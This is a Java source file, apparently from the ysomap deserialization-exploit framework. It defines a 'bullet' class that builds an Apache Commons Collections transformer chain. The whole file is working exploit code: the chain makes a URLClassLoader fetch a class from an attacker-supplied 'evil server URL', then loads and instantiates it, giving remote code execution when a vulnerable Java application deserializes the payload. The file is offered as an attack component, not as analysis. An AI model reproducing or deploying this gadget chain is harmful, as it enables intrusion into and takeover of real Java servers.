package ysomap.gadget.bullet.collections;

import ysomap.annotation.Authors;
import ysomap.annotation.Dependencies;
import ysomap.annotation.Require;

import java.net.URLClassLoader;
import java.util.LinkedList;

/**
 * @author wh1t3P1g
 * @since 2020/2/16
 */
@Dependencies({"evil obj http server"})
@Authors({ Authors.WH1T3P1G })
public class TransformerWithResponseBullet extends TransformerBullet {

    @Require(name = "args" ,detail = "evil server URL")
    public String args;

    @Require(name="remoteObj", detail = "remote object name")
    public String remoteObj;

    /**
     * 利用URLClassLoader进行远程class或jar文件载入
     * 这里远程服务器挂载可以使用exploit里的xxx
     * @return transformers[]
     * @throws Exception err
     */
    @Override
    public Object getObject() throws Exception {
        initClazz();
        LinkedList<Object> transformers = new LinkedList<>();
        transformers.add(createConstantTransformer(URLClassLoader.class));
        transformers.add(createInvokerTransformer("getConstructor",
                new Class[] { Class[].class },
                new Object[] { new Class[] { java.net.URL[].class } }));
        transformers.add(createInvokerTransformer("newInstance",
                new Class[] { Object[].class },
                new Object[] { new Object[] { new java.net.URL[] { new java.net.URL(
                        args) } } }));
        transformers.add(createInvokerTransformer("loadClass",
                new Class[] { String.class }, new Object[] { remoteObj }));
        transformers.add(createInvokerTransformer("getConstructor",
                new Class[] {  },
                new Object[] { }));
        transformers.add(createInvokerTransformer(
                "newInstance",
                new Class[] { },
                new Object[] { }));
        transformers.add(createConstantTransformer(1));

        return createTransformerArray(transformers);
    }
}
